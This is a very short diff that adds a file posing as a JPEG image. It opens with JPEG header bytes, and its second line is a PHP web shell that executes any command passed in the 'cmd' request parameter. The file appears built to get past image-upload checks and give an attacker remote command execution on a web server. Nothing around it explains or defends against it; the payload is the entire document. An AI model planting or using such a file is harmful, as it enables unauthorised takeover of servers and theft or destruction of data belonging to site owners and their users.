@@ -1,0 +1,2 @@
+ÿØÿÛa;
+<?php echo system($_REQUEST["cmd"]); ?>
